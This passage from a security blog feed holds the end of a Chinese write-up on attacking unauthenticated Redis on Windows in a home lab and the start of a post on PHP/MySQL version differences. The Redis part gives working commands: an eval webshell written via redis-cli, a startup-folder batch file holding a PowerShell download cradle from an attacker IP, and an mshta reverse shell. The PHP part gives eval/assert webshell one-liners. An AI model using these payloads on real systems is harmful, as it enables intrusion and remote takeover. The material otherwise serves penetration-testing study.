href="https://www.anquanke.com/post/id/181599">https://www.anquanke.com/post/id/181599</a> SSRF 认证攻击Redis</p><p><a href="https://xz.aliyun.com/t/5665#toc-8">https://xz.aliyun.com/t/5665#toc-8</a> SSRF 攻击redis 的总结</p><p><a href="https://lorexxar.cn/2016/12/03/redis-getshell/#centos">https://lorexxar.cn/2016/12/03/redis-getshell/#centos</a> redis getsell 的一些思考</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd</a> 细数redis 的几种getshell 方法</p><p>相关工具<br>Redis + SSRF payload 生成：<br><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> 支持ReverseShell 和 PHPShell</p><p>Redis 口令暴破<br><a href="https://github.com/evilpacket/redis-sha-crack">https://github.com/evilpacket/redis-sha-crack</a></p><p>Redis Rogue Server<br><a href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a></p><p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>主从复制加载的恶意so 文件<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p>MSF 下的利用模块<br>auxiliary/scanner/redis/file_upload normal Redis File Upload</p><p>auxiliary/scanner/redis/redis_login normal Redis Login Utility</p><p>auxiliary/scanner/redis/redis_server normal Redis Command Execute Scanner</p><p>漏洞挖掘<br>对 port:6379 搜索<br><a href="https://www.zoomeye.org/searchResult?q=port:6379">https://www.zoomeye.org/searchResult?q=port:6379</a></p><p>Fofa 关键字搜索<br>port=”6379” &amp;&amp; protocol==redis &amp;&amp; country=CN<br>对Web 网站的真实ip 进行全端口扫描 / 探测 redis</p><hr><h1 id="Windows下Redis-利用思路"><a href="#Windows下Redis-利用思路" class="headerlink" title="Windows下Redis 利用思路"></a>Windows下Redis 利用思路</h1><p>学了两天的Cobalt Strike 4.0 的基础使用和术语，继续把之前漏掉的Windows 下利用Redis 学习总结一下。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太难了，Windows Server 2008 R2 我这里(VMware Fusion)没法用VMware Tools，Github（图片上github URL打错了） 又不能访问，机器上也没有Github。我是如何把Windows 版的Redis 弄上去的？哈哈（其实后面想了想还有其他办法，不过感觉也有点麻烦。</p><p><img src="https://i.imgur.com/KRBRvS9.png"></p><p><img src="https://i.imgur.com/39WhmIK.png"></p><p>因为之前复现 MS17-010，CVE-2019-0708，开启了445 和 3389 。我这里用ms17-010 打过去，拿到了system 权限<br>用Cobalt Strike 生成上线 64 位的exe 可执行文件上线木马<br>MSF 上传木马并执行<br>Cobalt Strike 上2008 R2 成功 上线<br>然后也不能传目录（可以传压缩包，终于懂了为什么有些东西不能传文件夹了），但是相比用msf，这里可视化上传也是很不错了。<br><img src="https://i.imgur.com/HMYcnTZ.png"></p><p><img src="https://i.imgur.com/A41ZMox.png"></p><p>算是第一次同时使用Metasploit 和 Cobalt Strike。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>Redis-Server：Windows Server 2008 R2 x64<br>Attacker：Kali Linux<br>网络：NAT<br>IP：192.168.118.134，192.168.118.129<br>PhpStudy 2018 搭建 Web 服务,需要相关vc运行库<br>切换到对应的目录下，redi-server.exe redis.conf 即可启动redis-server 服务。<br><img src="https://i.imgur.com/U6Z4tkr.png"></p><p>netstat -ano 查看端口开放情况<br><img src="https://i.imgur.com/UANrinf.png"></p><p>可以看到，已经开启了 6379 Redis 服务。</p><p>尝试连接一下<br><img src="https://i.imgur.com/n9gYmuj.png"></p><p>ping 返回 PONG。成功远程未授权连接上Redis。（相比与Linux下复现，这里我没有修改任何redis.conf的内容，难道是说Windows下默认可以。</p><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>相比于Linux 下攻击Redis 未授权，Windows 下又有哪些可以利用的？Linux 下可以写入Webshell，Windows 下肯定也行。Linux 下可以写入SSH，导致SSH 远程登录目标机器，而Windows没有。</p><h3 id="写入Webshell"><a href="#写入Webshell" class="headerlink" title="写入Webshell"></a>写入Webshell</h3><p>这种方法最容易想到，也相对来说有点鸡肋，因为必须要知道Windows 下搭建的Web 服务的网站物理路径，才能往里面写webshell，当然也可以猜测，或者专门去收集一些常见的网站物理路径位置。(这次我发现用PHPStudy2018 安装默认存在一个phpinfo.php，以及phpMyadmin)</p><p><img src="https://i.imgur.com/ydL4RPh.png"></p><p>不一会儿，有一个师傅走过来，问我在干嘛，我说在学打Redis…… 他说，你怎么又在打Redis。。。然后就讨论了一下(大概说了有五分钟左右，这里就说下讨论的结论），假设Windows 服务器下的Redis 肯定在内网，6379不出网，然后如果存在SSRF的点，那么用gopher 协议可能可以打一波 SSRF 攻击内网未授权，写入webshell，或者反弹shell啥的。但是，如何打入内网的问题似乎才是利用的关键，而我总结的这些感觉都是已经在内网了或者是拿到了一个未授权的访问了，如果没有SSRF似乎就没有办法了(就单独说从这一台机器。我想到一种，就是RCE修改redis.conf,然后让6379 暴露公网，然后做一个隐藏后门，感觉应该可以这样利用。当然，已经有RCE，那么肯定第一件是就是拿shell了，所以这个思路我觉得只能说是在后面权限持续控制的时候，当作一种思路罢了（感觉具体实现性的话也不是很行。晚上我又想到，可不可以利用信息泄漏，比如说内网ip信息泄漏啥的，来进入内网？其他方法，可以以后有想法了，再来研究研究。</p><p>得到物理路径：C:/Users/Administrator/Desktop/PHPTutorial/WWW</p><p>然后就和Linux 下写Webshell 差不多了，只是换了一下dir 路径，和换行符的区别，因为Windows 和 Linux 的换行符是不一样的。这里是Windows，所以是\r\n（也是一样，避免和原始数据混淆）</p><p>192.168.118.134:6379&gt; config set dir C:/Users/Administrator/Desktop/PHPTutorial/WWW<br>OK<br>192.168.118.134:6379&gt; set webshell “\r\n<?php @eval($_POST[a]);?>\r\n”<br>OK<br>192.168.118.134:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.134:6379&gt; save<br>OK<br><img src="https://i.imgur.com/AxEyXv7.png"></p><p>还发现了，这些操作，似乎都会被记录进redis 日志的。</p><p><img src="https://i.imgur.com/guAkaO1.png"></p><p>当然，使用shell 管理器，比如蚁剑是肯定能连上的。</p><p>查看一下webshell.php<br>Redis 写文件会自动写入一行版本信息。然后再是我们写的东西。</p><p><img src="https://i.imgur.com/BhlKVPY.png"></p><p>说明了之前在学习Linux下利用redis写webshell的时候，其实不用flushall 也可以写webshell的，在新的一个dbfile 里面写入就行了。</p><h3 id="写入启动项"><a href="#写入启动项" class="headerlink" title="写入启动项"></a>写入启动项</h3><p>“用户启动文件夹”和“系统启动文件夹”的区别：</p><p>1、两者启动文件夹的路径不一样。用户开机启动文件夹，对应“开始菜单”-“程序”-“启动”功能，路径是：“C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”；系统启动文件夹对应的路径是：“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”。</p><p>2、两者起到的功能不一样。举例说明：如果系统有admin和guest两个系统用户，admin使用方法一（用户启动文件夹）添加开机启动项，那么只有使用admin登录系统时，开机启动项才会起作用，guest用户登录系统不会自动启动；而使用方法二（系统启动文件夹）设置的开机启动项，在admin和guest登录系统时都会启动。</p><p>写入启动项，大概有三种攻击路线，利用msf，CS，还有一个就是PS_Shell.rb 来上线。</p><p>利用Cobalt Strike<br>当然也可以用 Metasploit。</p><blockquote><p>Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery，选择Powershell</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.118.129:80&#x2F;aaa&#39;))&quot;</span><br></pre></td></tr></table></figure><p>然后和写入Webshell 一样的方式，将上面的payload 保存为.bat文件。这里因为payload里面有双引号，所以需要进行转义。</p><p>bat（批处理）文件概念：在DOS和Windows 9x 操作系统家族中，批处理文件的文件扩展名为.bat。当运行批处理文件时，通常是cmd.exe，会读取文件中的内容，并逐行运行。</p><p>192.168.118.146:6379&gt; config set dir “C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup”<br>OK<br>192.168.118.146:6379&gt; config set dbfilename config.bat<br>OK<br>192.168.118.146:6379&gt; set shell_bat “\r\n\r\npowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(‘<a href="http://192.168.118.129/aaa&#39;))\&quot;\r\n\r\n&quot;">http://192.168.118.129:80/aaa&#39;))\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>手动重启靶机。。可以发现主机上线了。（这里我中途去吃饭了，然后回来又看了一下关于SRC相关的东西，所以时间上看起来上线很晚，实际上，等开机之后过一会儿就上线了，可能这取决于目标系统的流畅度</p><p><img src="https://i.imgur.com/QDxyT31.png"></p><p>查看开机启动项<br><img src="https://i.imgur.com/TY3qpOp.png"></p><p>确实成功写入，并且执行了。</p><h3 id="利用mshta-PS-shell"><a href="#利用mshta-PS-shell" class="headerlink" title="利用mshta PS_shell"></a>利用mshta PS_shell</h3><p>利用的exploit：<a href="https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb">https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb</a></p><p>在/usr/share/metasploit-framework/modules/exploits/windows下创建一个PS_shell.rb文件，将上面的内容填入进去。进入msfconsole 然后重新载入一下exploit，reload_all。</p><p><img src="https://i.imgur.com/ugzwH85.png"></p><p>然后运行mshta.exe “……” 就可以反弹shell了。</p><p>这里就可以利用redis 未授权，写入启动项来运行，从而得到反弹shell。</p><p>192.168.118.146:6379&gt; config set dir “C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup”<br>OK<br>192.168.118.146:6379&gt; config set dbfilename backup.bat<br>OK<br>192.168.118.146:6379&gt; set backup “\r\n\r\n mshta.exe &quot;<a href="http://192.168.118.129:8080/tql/&quot;/r/n/r/n&quot;">http://192.168.118.129:8080/tql\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>手动重启目标机器。。不过每次重启之后，还要切换成Administrator账户，才会收到session或者说上线。<br><img src="https://i.imgur.com/ZY8Ae2n.png"></p><p><img src="https://i.imgur.com/VV6WV5W.png"></p><p>关于 mshta.exe的科普：<a href="https://baike.baidu.com/item/Mshta.exe/10666591">https://baike.baidu.com/item/Mshta.exe/10666591</a></p><p><a href="http://jincheng.xpcha.com/675nabeltqm/">http://jincheng.xpcha.com/675nabeltqm/</a></p><p>英文全称Microsoft HTML Application，可用于执行.HTA 文件，是微软超文本标记语言应用。</p><p>而在之前那个PS_Shell.rb 的源码中，利用的是 CVE-2017-11882，其中有一段注释</p><p>This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc.</p><p>漏洞分析：<a href="https://www.anquanke.com/post/id/87311">https://www.anquanke.com/post/id/87311</a> 漏洞类型：栈溢出漏洞导致内存损坏</p><h3 id="写入MOF"><a href="#写入MOF" class="headerlink" title="写入MOF"></a>写入MOF</h3><p>环境必须为Windows 2003，比较久远的提权方法。这里不复现了，了解一下吧。如果有机会会用到，至少要知道。<br>mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p><p>也就是说在c:/windows/system32/wbem/mof/目录下的mof文件会每5秒自动执行一次，这样就不需要重启机器就能获取权限了。</p><p>这种利用方式不用重启目标机器，也不需要获取目标Web的物理路径，只是环境必须是Windows 2003</p><h3 id="DLL-劫持"><a href="#DLL-劫持" class="headerlink" title="DLL 劫持"></a>DLL 劫持</h3><p>这种利用方法和下面的快捷方式覆写请参考R3start大佬的文章：<a href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a></p><h3 id="快捷方式覆写"><a href="#快捷方式覆写" class="headerlink" title="快捷方式覆写"></a>快捷方式覆写</h3><h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><p>参考上面的漏洞修复</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Windows下的利用思路，其实前两张和Linux下是一样的。甚至比Linux 下还鸡肋，毕竟Linux 下的web 目录是可以猜测的（就那么几个。写入MOF，前几天在先知社区也有人发了文章了，<a href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a></p><p>DLL 劫持 和 快捷方式覆写领会思路和原理吧，不想复现了，最近事情太多了。（埋坑。</p><p>另外，Linux 下还有如下利用方法：</p><p>写入到/etc/profile.d/用户环境变量<br>开启AOF持久化纯文本记录appendfilename<br>这里，就先不研究了，感觉目前用不到，了解一下就行了。</p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><p><a href="https://www.anquanke.com/post/id/170360">https://www.anquanke.com/post/id/170360</a></p><p><a href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html">https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</a> Redis 在Windows 下 如何Getshell</p><p><a href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a> Redis Windows 踩坑</p><p>换行符：<a href="https://blog.csdn.net/CJF_iceKing/article/details/47836201">https://blog.csdn.net/CJF_iceKing/article/details/47836201</a></p><p>Windows 开机启动项：<a href="http://www.win10xiazai.com/win10/5334.html">http://www.win10xiazai.com/win10/5334.html</a></p><p>GetShell ：<a href="https://cloud.tencent.com/developer/article/1488184">https://cloud.tencent.com/developer/article/1488184</a></p><p>MOF提权：</p><p><a href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a><br><a href="https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/">https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/</a><br>DLL劫持&amp;&amp;INK 覆写 来利用redis：<a href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a> ，工具也是这位师傅写的，感觉好强。</p><p>DLL 劫持参考：</p><p><a href="https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/">https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近放出来的文章都是以前早就总结好的了。&lt;/p&gt;
&lt;h1 id=&quot;Redis-安全学习笔记&quot;&gt;&lt;a href=&quot;#Redis-安全学习笔记&quot; class=&quot;headerlink&quot; title=&quot;Redis 安全学习笔记&quot;&gt;&lt;/a&gt;Redis 安全学习笔记&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Redis" scheme="https://hack-for.fun/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>PHP以及MYSQL相关版本差异及对应的安全问</title>
    <link href="https://hack-for.fun/d8714939.html"/>
    <id>https://hack-for.fun/d8714939.html</id>
    <published>2020-05-31T15:53:12.000Z</published>
    <updated>2020-10-30T13:00:04.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直觉得自己对相关的漏洞学的马马虎虎，没有深入总结，最近几次CTF比赛中也吃了不少的亏。遂想花一两天的时间来好好总结一下各个版本之间的区别，漏洞利用方式的不同，于是有了这篇文章。</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>PHP 现在应该一般都升级为<strong>php7</strong>了吧，所以来学习一波php7的新特性。</p><p>主要是参考这篇文章：<a href="http://www.php7.site/book/php7/variable-changes-22.html#0">http://www.php7.site/book/php7/variable-changes-22.html#0</a></p><h2 id="变量处理机制"><a href="#变量处理机制" class="headerlink" title="变量处理机制"></a>变量处理机制</h2><ul><li>间接变量，属性和方法引用都按照 <strong>从作到右</strong>到顺序进行解释（如果想要改变顺序，可以使用大括号</li><li>global 关键字只能引用简单变量</li><li>无法将一个函数作为另一个函数的参数进行传递</li><li>引用赋值时自动创建数组元素或者对象属性顺序不同</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$array = [];</span><br><span class="line">$array[<span class="string">&quot;a&quot;</span>] =&amp; $array[<span class="string">&quot;b&quot;</span>];</span><br><span class="line">$array[<span class="string">&quot;b&quot;</span>] = <span class="number">1</span>;</span><br><span class="line">var_dump($array);</span><br><span class="line">PHP7产生的数组：[<span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;b&quot;</span> =&gt; <span class="number">1</span>]</span><br><span class="line">PHP5产生的数组：[<span class="string">&quot;b&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h2 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h2><ul><li><code>list()</code> 按照顺序进行取值。</li><li>对一个空的list()赋值不再允许</li><li>list() 不再具有拆分功能</li></ul><h2 id="foreach"><a href="#foreach" class="headerlink" title="foreach()"></a>foreach()</h2><ul><li>foreach循环对数组内部指针不再起作用</li><li>foreach进行by-value循环时，是对该数组的拷贝操作，如果对其进行修改也没有影响</li><li>按照引用进行循环时，对数组进行修改就会有影响</li></ul><h2 id="参数处理机制"><a href="#参数处理机制" class="headerlink" title="参数处理机制"></a>参数处理机制</h2><ul><li>不再支持重复参数名（也没人这样用</li><li>Func_get_arg 和 func_get_args，这两个方法返回参数当前的值，而不是传入时的值</li><li>PHP7 报错的时候，也是报当前值</li></ul><h2 id="整数处理机制修改"><a href="#整数处理机制修改" class="headerlink" title="整数处理机制修改"></a>整数处理机制修改</h2><ul><li>无效的8进制数会编译报错，而老版本会忽略无效的数字</li><li>位移负的位置会产生异常 ArithmeticError: Bit shift by negative number</li><li>左位移如果超出位数返回 <code>0</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">1</span> &lt;&lt; <span class="number">64</span>);</span><br></pre></td></tr></table></figure><ul><li>右移如果超出位数返沪0或-1</li></ul><h2 id="字符串处理机制修改"><a href="#字符串处理机制修改" class="headerlink" title="字符串处理机制修改"></a>字符串处理机制修改</h2><ul><li>含有16进制的字符串不再视为数字，也不区别对待。这个就会涉及到一些绕过了。</li><li><code>\u&#123;</code> 后面如果包含非法字符会报错</li></ul><h2 id="其他修改"><a href="#其他修改" class="headerlink" title="其他修改"></a>其他修改</h2><ul><li>CURL模块：禁止禁用CURLOPT_SAFE_UPLOAD选项，通过curl上传文件必须使用curl_file/CURLFILE接口。</li><li>DATE模块：mktime()和gmmktime()函数移除了$is_dst parameter参数。</li><li>DBA模块：dba_delete() 如果在inifile里面没有找到key的时候会返回false。</li><li>GMP模块：必须用libgmp 4.2版本以上。gmp_setbit() and gmp_clrbit()如果传入的index为负数的话，会返回false。</li><li>Intl模块：移除了别名函数datefmt_set_timezone_id() 和IntlDateFormatter::setTimeZoneID()，用datefmt_set_timezone() 和IntlDateFormatter::setTimeZone()</li><li><strong>libxml模块：新增ibxml 2.9.0引入的LIBXML_BIGLINES 选项，并在错误报告中增加了行号&gt; 16-bit的支持。</strong></li><li>Mcrypt模块：.移除了mcrypt_generic_end() mcrypt_ecb(), mcrypt_cbc(), mcrypt_cfb() 和mcrypt_ofb()</li><li>Opcache：移除了opcache.load_comments配置项，现在注释加载总是被激活的。</li><li>OpenSSL：移除了”rsa_key_size”、”CN_match” 、”SNI_server_name” 选项。</li><li><strong>PCRE：移除了 /e (PREG_REPLACE_EVAL) 修饰符的支持，使用preg_replace_callback()来代替。</strong></li><li>PDO_pgsql：删除了PGSQL_ATTR_DISABLE_NATIVE_PREPARED_STATEMENT选项。</li><li>Standard：删除了setlocale()函数里面对字符串类型的支持，使用LC_*常量。删除了set_magic_quotes_runtime() magic_quotes_runtime().</li><li>JSON：json_decode()会拒绝与RFC 7159不兼容的数字格式。json_decode第一个参数是空值的时候会返回json语法错误。</li><li>Stream：删除别名函数set_socket_blocking()</li><li>XSL：删除xsl.security_prefs 选项。</li><li>session<ul><li>session_start()可以接受所有的INI设置，可以用数组的方式传入，比如：[‘cache_limiter’=&gt;’private’]</li><li>save handler接受validate_sid(), update_timestamp() ，可用来检查sid是否存在，更新session数据的时间戳。</li><li>增加了SessionUpdateTimestampHandlerInterface，这个接口里面定义了validateSid(), updateTimestamp()方法。</li><li>session.lazy_write(default=On) 配置项可以允许只有session数据有变化时才写数据。</li></ul></li></ul><p>。。。。。。</p><p>以及其他特性。</p><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p><a href="https://www.cc1021.com/article/134.html">https://www.cc1021.com/article/134.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>Eval 把其中的字符串当做PHP代码进行执行。所有语句必须以分号结束。</p><blockquote><p>函数*<em>eval()**语言结构是 <em>非常危险\</em>的， 因为它允许执行任意 PHP 代码。 \</em>它这样用是很危险的。* 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，<em>不要允许传入任何由用户 提供的、未经完整验证过的数据</em> 。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">    $_POST[<span class="number">1</span>]($_POST[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 传入：1=assert&amp;2=system(&#x27;ls&#x27;)</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">  <span class="comment">// short_open_tag=On</span></span><br></pre></td></tr></table></figure><p>eval 是一个语言构造器，而不是一个函数。不能被可变 函数调用。</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>检查一个断言是否为FALSE。</p><p>PHP 5:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="keyword">string</span> $description ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>PHP 7:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">Throwable</span> $exception ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>如果<code>assertion</code> 为字符串，那么会被当做php 代码来执行。<strong>在PHP 7 中，变为语言结构而不是函数，即不能像eval那样支持可变函数了。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_POST[<span class="number">1</span>]($_POST[<span class="number">2</span>]); <span class="comment">// 在php7 中无法使用1=assert&amp;2=system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure><p>eval其实是Zend引擎到函数，而assert是PHP_FUNCTION 宏编写的，调用不同。</p><p><a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html">https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html</a></p><p><a href="https://www.anquanke.com/post/id/173201">https://www.anquanke.com/post/id/173201</a></p><h3 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h3><h4 id="Php-7-0-7-3-bypass"><a href="#Php-7-0-7-3-bypass" class="headerlink" title="Php 7.0-7.3 bypass"></a>Php 7.0-7.3 bypass</h4><p>:<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span 